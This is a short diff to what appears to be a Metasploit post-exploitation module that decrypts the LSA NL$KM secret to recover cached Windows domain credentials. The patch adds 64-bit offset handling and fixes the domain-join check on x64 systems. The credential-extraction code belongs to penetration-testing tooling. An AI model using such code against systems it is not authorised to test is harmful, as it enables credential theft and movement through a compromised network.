@@ -44,7 +44,11 @@ class Metasploit3 < Msf::Post
     if lsa_vista_style?
       nlkm_dec = decrypt_lsa_data(nlkm, lsakey)
     else
-      nlkm_dec = decrypt_secret_data(nlkm[0xC..-1], lsakey)
+      if sysinfo['Architecture'] =~ /wow64/i || sysinfo['Architecture'] =~ /x64/
+        nlkm_dec = decrypt_secret_data(nlkm[0x10..-1], lsakey)
+      else # 32 bits
+        nlkm_dec = decrypt_secret_data(nlkm[0xC..-1], lsakey)
+      end
     end
 
     return nlkm_dec
@@ -291,7 +295,13 @@ class Metasploit3 < Msf::Post
     begin
       print_status("Executing module against #{sysinfo['Computer']}")
       client.railgun.netapi32()
-      if client.railgun.netapi32.NetGetJoinInformation(nil,4,4)["BufferType"] != 3
+      join_status = client.railgun.netapi32.NetGetJoinInformation(nil,4,4)["BufferType"]
+
+      if sysinfo['Architecture'] =~ /x64/
+        join_status = join_status & 0x00000000ffffffff
+      end
+
+      if join_status != 3
         print_error("System is not joined to a domain, exiting..")
         return
       end
